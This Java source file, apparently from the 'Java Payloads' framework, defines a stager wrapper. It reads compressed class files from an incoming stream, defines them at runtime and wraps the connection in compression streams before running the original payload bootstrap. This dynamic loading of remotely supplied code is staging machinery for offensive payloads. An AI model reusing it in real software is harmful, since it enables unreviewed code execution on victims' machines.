/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder.dynstager;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.zip.GZIPInputStream;

public class FullGZIP extends WrappingDynStagerBuilder {

	public void bootstrapWrap(String[] parameters, boolean needWait) throws Exception {
		bootstrapOrig(parameters, needWait);
	}

	protected void bootstrapWrap(InputStream rawIn, OutputStream out, String[] parameters) {
		try {
			DataInputStream din = new DataInputStream(rawIn);
			din.readInt();
			byte[] compressed = new byte[din.readInt()];
			din.readFully(compressed);
			DataInputStream helperClasses = new DataInputStream(new GZIPInputStream(new ByteArrayInputStream(compressed)));
			Class[] classes = new Class[2];
			for (int i = 0; i < classes.length; i++) {
				int length = helperClasses.readInt();
				final byte[] classfile = new byte[length];
				helperClasses.readFully(classfile);
				classes[i] = define(classfile);
			}
			InputStream gzin = (InputStream) classes[0].getConstructor(new Class[] { Class.forName("java.io.InputStream") }).newInstance(new Object[] { din });
			OutputStream gzout = (OutputStream) classes[1].getConstructor(new Class[] { Class.forName("java.io.OutputStream") }).newInstance(new Object[] { out });
			bootstrapOrig(new BufferedInputStream(gzin), new BufferedOutputStream(gzout), parameters);
		} catch (final Throwable t) {
			t.printStackTrace(new PrintStream(out, true));
		}
	}

	protected final Class define(byte[] classfile) throws IOException {
		throw new RuntimeException("Never used!");
	}
}
